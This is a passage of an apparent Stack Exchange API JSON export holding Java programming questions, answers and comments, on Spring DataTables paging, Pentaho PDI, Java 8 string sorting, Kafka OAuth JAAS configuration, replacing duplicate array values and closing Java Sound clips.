&quot;/representatives&quot;, method = RequestMethod.GET)\n    public DataTablesOutput&lt;Representatives&gt; list(@Valid DataTablesInput input) {\n        return repository.findAll(input);\n    }\n\n    @RequestMapping(value = &quot;/representatives&quot;, method = RequestMethod.POST)\n    public DataTablesOutput&lt;Representatives&gt; listPOST(@Valid @RequestBody DataTablesInput input) {\n        int start = input.getStart();\n        input.setLength(10); // Set the number of records to retrieve to 10\n        return repository.findAll(input);\n    }//I think that these are the two method I'm supposed to use to send and retrieve data to and from the database. **This is where I am stuck.**\n\n\n\n    @PostMapping(&quot;/getEntities&quot;)\n    @ResponseBody\n    public DataTablesOutput&lt;Representatives&gt; getEntities(@Valid @RequestBody DataTablesInput input) {\n        return repository.findAll(input);\n    }\n//The getFirstTenEntities method creates a ModelAndView, as well as an attribute for the data that is used to iterate over on the HTML page.\n    public ModelAndView getFirstTenEntities(String returnPage, String attributeName) {\n        ModelAndView modelAndView = new ModelAndView(returnPage);\n        modelAndView.addObject(attributeName, repService.getEntities());\n        return modelAndView;\n    }\n//This method just returns the viewModel `allRepresentatives.html`\n    @GetMapping(&quot;getFirstTenRepresentatives&quot;)\n    public ModelAndView getFirstTenReps(){\n        return getFirstTenEntities(&quot;allRepresentatives&quot;,\n                &quot;representatives&quot;);\n    }\n\n\n}\n</code></pre>\n<p><strong>Finally the main class:</strong></p>\n<pre class=\"lang-java prettyprint-override\"><code>@SpringBootApplication\n//@EnableJpaRepositories(repositoryFactoryBeanClass = DataTablesRepositoryFactoryBean.class)\npublic class DatatablesApplication {\n\n    public static void main(String[] args) {\n        SpringApplication.run(DatatablesApplication.class, args);\n    }\n\n}\n\n</code></pre>\n"},{"tags":["java","pentaho","pdi"],"answers":[{"tags":[],"owner":{"account_id":28408985,"reputation":1,"user_id":21732627,"display_name":"Luis Clemente"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1683722953,"creation_date":1683722919,"answer_id":76218627,"question_id":76098966,"body_markdown":"finally i fix the problem !!! The problem was that the transformation did not save the database connection because the database connection  it was not used . The solution has been easy , i have created a step in the transformation that uses the database connection. Then, when run the tranformation not crash y run correctly.\r\nBest regards !!\r\n\r\n[screenshot][1]\r\n\r\n\r\n  [1]: https://i.stack.imgur.com/WAVzk.png","title":"Create tables automatically with PDI blueprints","body":"<p>finally i fix the problem !!! The problem was that the transformation did not save the database connection because the database connection  it was not used . The solution has been easy , i have created a step in the transformation that uses the database connection. Then, when run the tranformation not crash y run correctly.\nBest regards !!</p>\n<p><a href=\"https://i.stack.imgur.com/WAVzk.png\" rel=\"nofollow noreferrer\">screenshot</a></p>\n"}],"owner":{"account_id":28408985,"reputation":1,"user_id":21732627,"display_name":"Luis Clemente"},"comment_count":0,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":30,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"answer_count":1,"score":0,"last_activity_date":1683722953,"creation_date":1682410368,"question_id":76098966,"body_markdown":"i&#180;m trying to run the included example in blueprints to auto create table and i have a error. I can&#180;t get it to work.\r\n\r\nThe example of PDI blueprint: https://github.com/mattcasters/blueprints\r\nI have the setup ok but when i run &quot;create-all-tables.ktr&quot; get this error: &#160;Unexpected error : org.mozilla.javascript.EcmaError: TypeError: Cannot call method &quot;quoteField&quot; of null (trans_End#8) .\r\nThe problem is the step javascript with the function&#160; &quot;valueMeta.setName( dbMeta.quoteField(name)&quot; .\r\nI would be very grateful for any help .\r\n\r\n\r\n[Screenshot 1](https://i.stack.imgur.com/vLNUE.png)\r\n\r\n[Screenshot 2](https://i.stack.imgur.com/EEF7c.png)\r\n\r\n[Screenshot 3](https://i.stack.imgur.com/9yfHe.png)\r\n\r\nMany thanks in advance.","title":"Create tables automatically with PDI blueprints","body":"<p>i´m trying to run the included example in blueprints to auto create table and i have a error. I can´t get it to work.</p>\n<p>The example of PDI blueprint: <a href=\"https://github.com/mattcasters/blueprints\" rel=\"nofollow noreferrer\">https://github.com/mattcasters/blueprints</a>\nI have the setup ok but when i run &quot;create-all-tables.ktr&quot; get this error:  Unexpected error : org.mozilla.javascript.EcmaError: TypeError: Cannot call method &quot;quoteField&quot; of null (trans_End#8) .\nThe problem is the step javascript with the function  &quot;valueMeta.setName( dbMeta.quoteField(name)&quot; .\nI would be very grateful for any help .</p>\n<p><a href=\"https://i.stack.imgur.com/vLNUE.png\" rel=\"nofollow noreferrer\">Screenshot 1</a></p>\n<p><a href=\"https://i.stack.imgur.com/EEF7c.png\" rel=\"nofollow noreferrer\">Screenshot 2</a></p>\n<p><a href=\"https://i.stack.imgur.com/9yfHe.png\" rel=\"nofollow noreferrer\">Screenshot 3</a></p>\n<p>Many thanks in advance.</p>\n"},{"tags":["java","sorting","arraylist","collections","java-8"],"comments":[{"owner":{"account_id":22057425,"reputation":135,"user_id":16320675,"display_name":"user16320675"},"score":3,"creation_date":1683713537,"post_id":76217086,"comment_id":134407709,"body_markdown":"are you sure you want `100_2` before `100_1_1` ? (otherwise you could use something similar to `keyValues.stream().sorted(Comparator.comparing(s -&gt; Runtime.Version.parse(s.replace(&quot;_&quot;,&quot;.&quot;)))).toList()`)","body":"are you sure you want <code>100_2</code> before <code>100_1_1</code> ? (otherwise you could use something similar to <code>keyValues.stream().sorted(Comparator.comparing(s -&gt; Runtime.Version.parse(s.replace(&quot;_&quot;,&quot;.&quot;)))).toList()</code>)"},{"owner":{"account_id":9254180,"reputation":35,"user_id":6873651,"display_name":"Karthikeyan Sankar"},"score":0,"creation_date":1683716369,"post_id":76217086,"comment_id":134408339,"body_markdown":"Hi @user16320675 instead of Runtime.Version.parse any other approach in java 8","body":"Hi @user16320675 instead of Runtime.Version.parse any other approach in java 8"},{"owner":{"account_id":3211603,"reputation":289297,"user_id":2711488,"display_name":"Holger"},"score":4,"creation_date":1683716370,"post_id":76217086,"comment_id":134408340,"body_markdown":"“based on underscores count”—nowhere in your question is a dependency between your intended order and the number of underscores explained. In fact, there is no attempt to explain the intended order at all. If you only want that exact output you have shown, just add the strings in that order. If you want a general solution, you have to explain the intended logic behind it.","body":"“based on underscores count”—nowhere in your question is a dependency between your intended order and the number of underscores explained. In fact, there is no attempt to explain the intended order at all. If you only want that exact output you have shown, just add the strings in that order. If you want a general solution, you have to explain the intended logic behind it."},{"owner":{"account_id":9254180,"reputation":35,"user_id":6873651,"display_name":"Karthikeyan Sankar"},"score":0,"creation_date":1683717306,"post_id":76217086,"comment_id":134408545,"body_markdown":"Hi @Holger i have updated the question and answer but it needs to occur only java 8","body":"Hi @Holger i have updated the question and answer but it needs to occur only java 8"},{"owner":{"account_id":3211603,"reputation":289297,"user_id":2711488,"display_name":"Holger"},"score":2,"creation_date":1683717385,"post_id":76217086,"comment_id":134408562,"body_markdown":"You still didn’t describe the *intended logic* behind the result order.","body":"You still didn’t describe the <i>intended logic</i> behind the result order."},{"owner":{"account_id":3211603,"reputation":289297,"user_id":2711488,"display_name":"Holger"},"score":3,"creation_date":1683720552,"post_id":76217086,"comment_id":134409370,"body_markdown":"Providing a single example is not describing the general logic behind the result. Inserting “after that” does not improve anything; we already know what comes after what in your single example. Software has to work even if you don’t know the actual input at compile-time. Can you explain *without referring to your example*, what the software is supposed to do?","body":"Providing a single example is not describing the general logic behind the result. Inserting “after that” does not improve anything; we already know what comes after what in your single example. Software has to work even if you don’t know the actual input at compile-time. Can you explain <i>without referring to your example</i>, what the software is supposed to do?"}],"answers":[{"tags":[],"owner":{"account_id":21724606,"reputation":722,"user_id":16034206,"display_name":"experiment unit 1998X"},"down_vote_count":0,"up_vote_count":4,"is_accepted":true,"score":4,"last_activity_date":1683722512,"creation_date":1683713871,"answer_id":76217247,"question_id":76217086,"body_markdown":"I made a comparator then split the string and process based on the min amount of tokens each string has.\r\n\r\n    static Comparator&lt;String&gt; stringComparator = new Comparator&lt;String&gt;() {\r\n            @Override\r\n            public int compare(String o1, String o2) {\r\n                String[] s1 = o1.split(&quot;_&quot;);\r\n                String[] s2 = o2.split(&quot;_&quot;);\r\n    \r\n                int minLen = Math.min(s1.length, s2.length);\r\n    \r\n                for (int i=0; i &lt; minLen; i++){\r\n                    if (!s1[i].equals(s2[i])){\r\n                        return Integer.parseInt(s1[i]) - Integer.parseInt(s2[i]);\r\n    //                    return s1[i].compareTo(s2[i]);  //not natural order/sort\r\n                    }\r\n                }\r\n    \r\n                return o1.compareTo(o2);\r\n            }\r\n        };\r\n\r\nCalling it like so:\r\n\r\n        List&lt;String&gt; keyValues = new ArrayList&lt;String&gt;();\r\n        keyValues.add(&quot;100001&quot;);\r\n        keyValues.add(&quot;100002&quot;);\r\n        keyValues.add(&quot;100002_1&quot;);\r\n        keyValues.add(&quot;100003&quot;);\r\n        keyValues.add(&quot;100&quot;);\r\n        keyValues.add(&quot;100_1&quot;);\r\n        keyValues.add(&quot;100_2&quot;);\r\n        keyValues.add(&quot;100_1_1&quot;);\r\n        keyValues.add(&quot;100_10_20&quot;);\r\n        keyValues.add(&quot;10000001&quot;);\r\n        keyValues.stream().sorted(stringComparator).forEach(System.out::println);\r\n\r\nGives output:\r\n\r\n    100\r\n    100_1\r\n    100_1_1\r\n    100_2\r\n    100_10_20\r\n    100001\r\n    100002\r\n    100002_1\r\n    100003\r\n    10000001\r\n","title":"Java List String sort Based on Integer with multiple underscore&#39;s","body":"<p>I made a comparator then split the string and process based on the min amount of tokens each string has.</p>\n<pre><code>static Comparator&lt;String&gt; stringComparator = new Comparator&lt;String&gt;() {\n        @Override\n        public int compare(String o1, String o2) {\n            String[] s1 = o1.split(&quot;_&quot;);\n            String[] s2 = o2.split(&quot;_&quot;);\n\n            int minLen = Math.min(s1.length, s2.length);\n\n            for (int i=0; i &lt; minLen; i++){\n                if (!s1[i].equals(s2[i])){\n                    return Integer.parseInt(s1[i]) - Integer.parseInt(s2[i]);\n//                    return s1[i].compareTo(s2[i]);  //not natural order/sort\n                }\n            }\n\n            return o1.compareTo(o2);\n        }\n    };\n</code></pre>\n<p>Calling it like so:</p>\n<pre><code>    List&lt;String&gt; keyValues = new ArrayList&lt;String&gt;();\n    keyValues.add(&quot;100001&quot;);\n    keyValues.add(&quot;100002&quot;);\n    keyValues.add(&quot;100002_1&quot;);\n    keyValues.add(&quot;100003&quot;);\n    keyValues.add(&quot;100&quot;);\n    keyValues.add(&quot;100_1&quot;);\n    keyValues.add(&quot;100_2&quot;);\n    keyValues.add(&quot;100_1_1&quot;);\n    keyValues.add(&quot;100_10_20&quot;);\n    keyValues.add(&quot;10000001&quot;);\n    keyValues.stream().sorted(stringComparator).forEach(System.out::println);\n</code></pre>\n<p>Gives output:</p>\n<pre><code>100\n100_1\n100_1_1\n100_2\n100_10_20\n100001\n100002\n100002_1\n100003\n10000001\n</code></pre>\n"}],"owner":{"account_id":9254180,"reputation":35,"user_id":6873651,"display_name":"Karthikeyan Sankar"},"comment_count":6,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":149,"favorite_count":0,"down_vote_count":2,"up_vote_count":2,"accepted_answer_id":76217247,"answer_count":1,"score":0,"last_activity_date":1683722512,"creation_date":1683712662,"question_id":76217086,"body_markdown":"Hi All I have arrayList of String datatype but needs to sort like integer with multiple underscore&#39;s using **Java 8** only ,For your reference I have added sample data, the original data came Liferay 7.1 DDL\r\n\r\n    List&lt;String&gt; keyValues = new ArrayList&lt;String&gt;();\r\n    keyValues.add(&quot;100_10_20_1&quot;);\r\n    keyValues.add(&quot;100001&quot;);\r\n    keyValues.add(&quot;100002&quot;);\r\n    keyValues.add(&quot;100002_1&quot;);\r\n    keyValues.add(&quot;100003&quot;);\r\n    keyValues.add(&quot;100&quot;);\r\n    keyValues.add(&quot;100_1&quot;);\r\n    keyValues.add(&quot;100_2&quot;);\r\n    keyValues.add(&quot;100_1_1&quot;);\r\n    keyValues.add(&quot;100_10_20&quot;);\r\n    keyValues.add(&quot;10000001&quot;);\r\n    keyValues.add(&quot;100_10_20_2&quot;);\r\n\r\ni tried to replace the underscore with 0 but what happens sometimes 100_1 replace \\_ with 0 then it becomes 10001 but what if i already have 10001 value present in list ? even same thing for empty if i replace \\_ with &quot;&quot; then it becomes  1001 but what if i already have 1001 then again i am facing issue\r\n\r\n**Exact logic based on underscore was** \r\n \r\n\r\n     100\r\n     100_1\r\n     100_1_2 \r\n     /after that only/\r\n     100_2\r\n     100_2_2\r\n    /after that/\r\n     103\r\n     104\r\n     105\r\n     10000\r\n    /similarly the pattern repeats/\r\n     10000_1\r\n     10000_2\r\n     10000_2_1\r\n     100002\r\n\r\ni need the exact **output** as\r\n\r\n   \r\n\r\n        100\r\n        100_1\r\n        100_1_1\r\n        100_2\r\n        100_10_20\r\n        100_10_20_1\r\n        100_10_20_2\r\n        100001\r\n        100002\r\n        100002_1\r\n        100003\r\n        10000001\r\n\r\ni tried with replacing underscore with 0 or empty space but there is possiblity of if it had already that number present in list,if i replace with dot and storing as Double then multiple pointer exception will occur","title":"Java List String sort Based on Integer with multiple underscore&#39;s","body":"<p>Hi All I have arrayList of String datatype but needs to sort like integer with multiple underscore's using <strong>Java 8</strong> only ,For your reference I have added sample data, the original data came Liferay 7.1 DDL</p>\n<pre><code>List&lt;String&gt; keyValues = new ArrayList&lt;String&gt;();\nkeyValues.add(&quot;100_10_20_1&quot;);\nkeyValues.add(&quot;100001&quot;);\nkeyValues.add(&quot;100002&quot;);\nkeyValues.add(&quot;100002_1&quot;);\nkeyValues.add(&quot;100003&quot;);\nkeyValues.add(&quot;100&quot;);\nkeyValues.add(&quot;100_1&quot;);\nkeyValues.add(&quot;100_2&quot;);\nkeyValues.add(&quot;100_1_1&quot;);\nkeyValues.add(&quot;100_10_20&quot;);\nkeyValues.add(&quot;10000001&quot;);\nkeyValues.add(&quot;100_10_20_2&quot;);\n</code></pre>\n<p>i tried to replace the underscore with 0 but what happens sometimes 100_1 replace _ with 0 then it becomes 10001 but what if i already have 10001 value present in list ? even same thing for empty if i replace _ with &quot;&quot; then it becomes  1001 but what if i already have 1001 then again i am facing issue</p>\n<p><strong>Exact logic based on underscore was</strong></p>\n<pre><code> 100\n 100_1\n 100_1_2 \n /after that only/\n 100_2\n 100_2_2\n/after that/\n 103\n 104\n 105\n 10000\n/similarly the pattern repeats/\n 10000_1\n 10000_2\n 10000_2_1\n 100002\n</code></pre>\n<p>i need the exact <strong>output</strong> as</p>\n<pre><code>    100\n    100_1\n    100_1_1\n    100_2\n    100_10_20\n    100_10_20_1\n    100_10_20_2\n    100001\n    100002\n    100002_1\n    100003\n    10000001\n</code></pre>\n<p>i tried with replacing underscore with 0 or empty space but there is possiblity of if it had already that number present in list,if i replace with dot and storing as Double then multiple pointer exception will occur</p>\n"},{"tags":["java","apache-kafka","oauth-2.0"],"owner":{"account_id":6746737,"reputation":89,"user_id":5198131,"display_name":"A. Vasyukhin"},"comment_count":0,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":102,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"answer_count":0,"score":0,"last_activity_date":1683722456,"creation_date":1683722456,"question_id":76218548,"body_markdown":"I had a next configuration for KafkaAdminClient:\r\n```\r\nclient-config {\r\n  bootstrap.servers = ${bootstrap.servers}\r\n  schema.registry.url = ${schema.registry.url}\r\n  security.protocol=SASL_PLAINTEXT\r\n  sasl.oauthbearer.token.endpoint.url=“url”\r\n  sasl.mechanism=&quot;OAUTHBEARER&quot;\r\n  sasl.login.callback.handler.class=&quot;org.apache.kafka.common.security.oauthbearer.secured.OAuthBearerLoginCallbackHandler&quot;\r\n  sasl.jaas.config = &quot;file:absolute/path/to/file”\r\n}\r\n```\r\nConfiguration file for jaas (we use OAuth 2.0 for authorization):\r\n```\r\nKafkaClient {\r\n    org.apache.kafka.common.security.oauthbearer.OAuthBearerLoginModule required\r\n    oauth.client.id=&quot;uid&quot;\r\n    oauth.client.secret=&quot;secret&quot;\r\n    oauth.scope=&quot;scope&quot;;\r\n};\r\n```\r\nHowever I got an error:\r\n```\r\nCaused by: java.lang.IllegalArgumentException: Login module control flag is not available in the JAAS config\r\n```\r\nWhat is reason of this and how can I fix it?","title":"Login module control flag is not available in the JAAS config","body":"<p>I had a next configuration for KafkaAdminClient:</p>\n<pre><code>client-config {\n  bootstrap.servers = ${bootstrap.servers}\n  schema.registry.url = ${schema.registry.url}\n  security.protocol=SASL_PLAINTEXT\n  sasl.oauthbearer.token.endpoint.url=“url”\n  sasl.mechanism=&quot;OAUTHBEARER&quot;\n  sasl.login.callback.handler.class=&quot;org.apache.kafka.common.security.oauthbearer.secured.OAuthBearerLoginCallbackHandler&quot;\n  sasl.jaas.config = &quot;file:absolute/path/to/file”\n}\n</code></pre>\n<p>Configuration file for jaas (we use OAuth 2.0 for authorization):</p>\n<pre><code>KafkaClient {\n    org.apache.kafka.common.security.oauthbearer.OAuthBearerLoginModule required\n    oauth.client.id=&quot;uid&quot;\n    oauth.client.secret=&quot;secret&quot;\n    oauth.scope=&quot;scope&quot;;\n};\n</code></pre>\n<p>However I got an error:</p>\n<pre><code>Caused by: java.lang.IllegalArgumentException: Login module control flag is not available in the JAAS config\n</code></pre>\n<p>What is reason of this and how can I fix it?</p>\n"},{"tags":["java","arrays","sorting"],"comments":[{"owner":{"account_id":963516,"reputation":10188,"user_id":987358,"accept_rate":40,"display_name":"Michael Butscher"},"score":1,"creation_date":1537645933,"post_id":52460309,"comment_id":91862662,"body_markdown":"Show code as properly formatted text in the question, not as image.","body":"Show code as properly formatted text in the question, not as image."},{"owner":{"account_id":963516,"reputation":10188,"user_id":987358,"accept_rate":40,"display_name":"Michael Butscher"},"score":0,"creation_date":1537646738,"post_id":52460309,"comment_id":91862850,"body_markdown":"(1) After sorting, duplicates are direct neighbours of each other so the nested `for`s aren&#39;t necessary. (2) If multiple duplicates appear they are always replaced with the same number `arr[n-1]+48`","body":"(1) After sorting, duplicates are direct neighbours of each other so the nested <code>for</code>s aren&#39;t necessary. (2) If multiple duplicates appear they are always replaced with the same number <code>arr[n-1]+48</code>"},{"owner":{"account_id":13861761,"reputation":1,"user_id":10017437,"display_name":"satyam tiwari"},"score":0,"creation_date":1537646786,"post_id":52460309,"comment_id":91862866,"body_markdown":"edited.... plz suggest some other logic for the problem, since above code is not working if there are same elements at the last indexes, i.e for eg, at n-2 &amp; n-1 position","body":"edited.... plz suggest some other logic for the problem, since above code is not working if there are same elements at the last indexes, i.e for eg, at n-2 &amp; n-1 position"},{"owner":{"account_id":963516,"reputation":10188,"user_id":987358,"accept_rate":40,"display_name":"Michael Butscher"},"score":0,"creation_date":1537646998,"post_id":52460309,"comment_id":91862906,"body_markdown":"Introduce another variable, e.g. `newNumber` which should be initially one (or 48) more than greatest number. Each time you assign a new number to a duplicate, increase `newNumber`.","body":"Introduce another variable, e.g. <code>newNumber</code> which should be initially one (or 48) more than greatest number. Each time you assign a new number to a duplicate, increase <code>newNumber</code>."},{"owner":{"account_id":13861761,"reputation":1,"user_id":10017437,"display_name":"satyam tiwari"},"score":0,"creation_date":1537647368,"post_id":52460309,"comment_id":91863011,"body_markdown":"ya....!! got it... thank u...!!","body":"ya....!! got it... thank u...!!"}],"answers":[{"tags":[],"owner":{"account_id":13861761,"reputation":1,"user_id":10017437,"display_name":"satyam tiwari"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1537647476,"creation_date":1537647476,"answer_id":52460542,"question_id":52460309,"body_markdown":"this will be the solution of above problem.\r\n\r\n    import java.util.*;\r\n    class duplicates {\r\n      public static void main(String[] args) {\r\n        Scanner sc=new Scanner(System.in);\r\n        System.out.println(&quot;input the size&quot;);\r\n        int n = sc.nextInt();\r\n        int arr[]=new int[n];\r\n       System.out.println(&quot;enter the elements of an array&quot;);\r\n        for (int i=0;i&lt;n;i++)\r\n        {\r\n           arr[i]=sc.nextInt();\r\n        }\r\n        Arrays.sort(arr);\r\n       int nw = 1;\r\n        for(int i=0;i&lt;n;i++){\r\n          for(int j=i+1;j&lt;n;j++){\r\n            if(arr[i]==arr[j])\r\n            {\r\n              arr[j]=arr[n-1]+nw;\r\n              nw++;\r\n              \r\n              \r\n            }\r\n          }\r\n        }\r\n       System.out.println(&quot;array is&quot; + Arrays.toString(arr));\r\n        \r\n      }\r\n    }\r\n\r\n","title":"i have tried to do the problem on my own, but not getting any great results, also attaching my code with the problem","body":"<p>this will be the solution of above problem.</p>\n\n<pre><code>import java.util.*;\nclass duplicates {\n  public static void main(String[] args) {\n    Scanner sc=new Scanner(System.in);\n    System.out.println(\"input the size\");\n    int n = sc.nextInt();\n    int arr[]=new int[n];\n   System.out.println(\"enter the elements of an array\");\n    for (int i=0;i&lt;n;i++)\n    {\n       arr[i]=sc.nextInt();\n    }\n    Arrays.sort(arr);\n   int nw = 1;\n    for(int i=0;i&lt;n;i++){\n      for(int j=i+1;j&lt;n;j++){\n        if(arr[i]==arr[j])\n        {\n          arr[j]=arr[n-1]+nw;\n          nw++;\n\n\n        }\n      }\n    }\n   System.out.println(\"array is\" + Arrays.toString(arr));\n\n  }\n}\n</code></pre>\n"},{"tags":[],"owner":{"account_id":19003156,"reputation":1,"user_id":13870304,"display_name":"b2jena"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1683722420,"creation_date":1683722420,"answer_id":76218542,"question_id":52460309,"body_markdown":"**Solution**\r\n\r\n    import java.util.ArrayList;\r\n    import java.util.List;\r\n    import java.util.Scanner;\r\n    \r\n    /**\r\n     * Replace repeating elements with greater that greatest values\r\n     * Input : arr = {1, 3, 4, 5, 3}\r\n     * Output : 1 3 4 5 6\r\n     * Explanation: Here 3 is repeating so it is replaced with 6\r\n     */\r\n    public class ReplaceRepeatedElementWithGreaterValue {\r\n        //returns the maximum element\r\n        static int max_element(int arr[]) {\r\n            int max = arr[0];\r\n            for (int i = 1; i &lt; arr.length; i++) {\r\n                if (max &lt; arr[i])\r\n                    max = arr[i];\r\n            }\r\n            return max;\r\n        }\r\n    \r\n        static void replaceElements(int arr[], int n) {\r\n            // Maximum element in an array\r\n            int maxx = max_element(arr);\r\n            List&lt;Integer&gt; s = new ArrayList&lt;&gt;();\r\n            for (int i = 0; i &lt; n; i++) {\r\n                // check whether the element is\r\n                // repeated or not\r\n                if (!s.contains(arr[i])) {\r\n                    s.add(arr[i]);\r\n                } else {\r\n                    // update the repeated element with the\r\n                    // maxx element\r\n                    arr[i] = maxx + 1;\r\n                    maxx++; // update the max\r\n                    // mark the maximum element as visited\r\n                    s.add(maxx);\r\n                }\r\n            }\r\n        }\r\n    \r\n        public static void main(String[] args) {\r\n            Scanner sc = new Scanner(System.in);\r\n            System.out.println(&quot;enter the size of the input array:&quot;);\r\n            int n = sc.nextInt();\r\n            int[] arr = new int[n];\r\n            System.out.println(&quot;enter the elements of an array:&quot;);\r\n            for (int i = 0; i &lt; n; i++) {\r\n                arr[i] = sc.nextInt();\r\n            }\r\n            replaceElements(arr, n);\r\n            for (int i = 0; i &lt; n; i++) {\r\n                System.out.print(arr[i] + &quot; &quot;);\r\n            }\r\n        }\r\n    }\r\n\r\n","title":"i have tried to do the problem on my own, but not getting any great results, also attaching my code with the problem","body":"<p><strong>Solution</strong></p>\n<pre><code>import java.util.ArrayList;\nimport java.util.List;\nimport java.util.Scanner;\n\n/**\n * Replace repeating elements with greater that greatest values\n * Input : arr = {1, 3, 4, 5, 3}\n * Output : 1 3 4 5 6\n * Explanation: Here 3 is repeating so it is replaced with 6\n */\npublic class ReplaceRepeatedElementWithGreaterValue {\n    //returns the maximum element\n    static int max_element(int arr[]) {\n        int max = arr[0];\n        for (int i = 1; i &lt; arr.length; i++) {\n            if (max &lt; arr[i])\n                max = arr[i];\n        }\n        return max;\n    }\n\n    static void replaceElements(int arr[], int n) {\n        // Maximum element in an array\n        int maxx = max_element(arr);\n        List&lt;Integer&gt; s = new ArrayList&lt;&gt;();\n        for (int i = 0; i &lt; n; i++) {\n            // check whether the element is\n            // repeated or not\n            if (!s.contains(arr[i])) {\n                s.add(arr[i]);\n            } else {\n                // update the repeated element with the\n                // maxx element\n                arr[i] = maxx + 1;\n                maxx++; // update the max\n                // mark the maximum element as visited\n                s.add(maxx);\n            }\n        }\n    }\n\n    public static void main(String[] args) {\n        Scanner sc = new Scanner(System.in);\n        System.out.println(&quot;enter the size of the input array:&quot;);\n        int n = sc.nextInt();\n        int[] arr = new int[n];\n        System.out.println(&quot;enter the elements of an array:&quot;);\n        for (int i = 0; i &lt; n; i++) {\n            arr[i] = sc.nextInt();\n        }\n        replaceElements(arr, n);\n        for (int i = 0; i &lt; n; i++) {\n            System.out.print(arr[i] + &quot; &quot;);\n        }\n    }\n}\n</code></pre>\n"}],"owner":{"account_id":13861761,"reputation":1,"user_id":10017437,"display_name":"satyam tiwari"},"comment_count":5,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":37,"favorite_count":0,"down_vote_count":2,"up_vote_count":0,"answer_count":2,"score":-2,"last_activity_date":1683722420,"creation_date":1537645768,"question_id":52460309,"body_markdown":"In given integer array, if any integer is repeating then replace it with a number greater than that number which has not been inserted yet in the array.\r\nEg. 1, 3, 4, 5, 3       Output: 1, 3, 4, 5, 6\r\n\r\n   \r\n\r\n    \r\n\r\n\r\n----------\r\n\r\n\r\n    class duplicates{\r\n      public static void main(String[] args) {\r\n        Scanner sc=new Scanner(System.in);\r\n        System.out.println(&quot;input the size&quot;);\r\n        int n = sc.nextInt();\r\n        int arr[]=new int[n];\r\n       System.out.println(&quot;enter the elements of an array&quot;);\r\n        for (int i=0;i&lt;n;i++)\r\n        {\r\n           arr[i]=sc.nextInt();\r\n        }\r\n        Arrays.sort(arr);\r\n       \r\n        for(int i=0;i&lt;n;i++){\r\n          for(int j=i+1;j&lt;n;j++){\r\n            if(arr[i]==arr[j])\r\n            {\r\n              arr[j]=arr[n-1]+48;\r\n              n--;\r\n              \r\n            }\r\n          }\r\n        }\r\n       System.out.println(&quot;array is&quot; + Arrays.toString(arr));\r\n        \r\n      }\r\n    }\r\n\r\n","title":"i have tried to do the problem on my own, but not getting any great results, also attaching my code with the problem","body":"<p>In given integer array, if any integer is repeating then replace it with a number greater than that number which has not been inserted yet in the array.\nEg. 1, 3, 4, 5, 3       Output: 1, 3, 4, 5, 6</p>\n\n<hr>\n\n<pre><code>class duplicates{\n  public static void main(String[] args) {\n    Scanner sc=new Scanner(System.in);\n    System.out.println(\"input the size\");\n    int n = sc.nextInt();\n    int arr[]=new int[n];\n   System.out.println(\"enter the elements of an array\");\n    for (int i=0;i&lt;n;i++)\n    {\n       arr[i]=sc.nextInt();\n    }\n    Arrays.sort(arr);\n\n    for(int i=0;i&lt;n;i++){\n      for(int j=i+1;j&lt;n;j++){\n        if(arr[i]==arr[j])\n        {\n          arr[j]=arr[n-1]+48;\n          n--;\n\n        }\n      }\n    }\n   System.out.println(\"array is\" + Arrays.toString(arr));\n\n  }\n}\n</code></pre>\n"},{"tags":["java","scala","javasound"],"comments":[{"owner":{"account_id":1047020,"reputation":511,"user_id":1051807,"display_name":"Nelson"},"score":0,"creation_date":1544649044,"post_id":37000717,"comment_id":94355455,"body_markdown":"Did you ever solve this problem?","body":"Did you ever solve this problem?"},{"owner":{"account_id":6899755,"reputation":524,"user_id":5299753,"accept_rate":73,"display_name":"Julian"},"score":0,"creation_date":1544689288,"post_id":37000717,"comment_id":94367358,"body_markdown":"I don&#39;t think so, sry. I just gave my old project a lookup. I created each clip exactly once and set its frameposition whenever I played it. \nAs I mentioned in my post, I am already quite sure, that its a memory problem, so chances might be, it could work if you declare the file as read only, when loading it. That way two seperate clips, loading the same data might get along.","body":"I don&#39;t think so, sry. I just gave my old project a lookup. I created each clip exactly once and set its frameposition whenever I played it.  As I mentioned in my post, I am already quite sure, that its a memory problem, so chances might be, it could work if you declare the file as read only, when loading it. That way two seperate clips, loading the same data might get along."},{"owner":{"account_id":6899755,"reputation":524,"user_id":5299753,"accept_rate":73,"display_name":"Julian"},"score":0,"creation_date":1544689413,"post_id":37000717,"comment_id":94367429,"body_markdown":"please ignore whatever I said about threads at that time tho :D","body":"please ignore whatever I said about threads at that time tho :D"}],"answers":[{"tags":[],"owner":{"account_id":908335,"reputation":5155,"user_id":942774,"accept_rate":100,"display_name":"Hendrik"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1683722285,"creation_date":1683722285,"answer_id":76218527,"question_id":37000717,"body_markdown":"When you `open()` a `Clip`, you basically allocate a native audio line, i.e. a *limited* resource. This means, you *must* close it, when you are done with it. An easy way of doing this is via a [LineListener](https://docs.oracle.com/en/java/javase/17/docs/api/java.desktop/javax/sound/sampled/LineListener.html).\r\n\r\nFor example:\r\n\r\n```java\r\nClip clip = createClip(&quot;some.wav&quot;);\r\nclip.addLineListener(event -&gt; {\r\n    if (LineEvent.Type.STOP.equals(event.getType()) {\r\n        event.getLine().close();\r\n    }\r\n});\r\nclip.start();\r\n```\r\n\r\nThis ensures that whenever a line is stopped (which happens when a clip has finished playing), the line is also closed and the used native resources are freed.\r\n\r\nNote that this means that you cannot simply play that same clip again, but that you must create/open a new clip.","title":"Java sound - LineUnavailableException:","body":"<p>When you <code>open()</code> a <code>Clip</code>, you basically allocate a native audio line, i.e. a <em>limited</em> resource. This means, you <em>must</em> close it, when you are done with it. An easy way of doing this is via a <a href=\"https://docs.oracle.com/en/java/javase/17/docs/api/java.desktop/javax/sound/sampled/LineListener.html\" rel=\"nofollow noreferrer\">LineListener</a>.</p>\n<p>For example:</p>\n<pre class=\"lang-java prettyprint-override\"><code>Clip clip = createClip(&quot;some.wav&quot;);\nclip.addLineListener(event -&gt; {\n    if 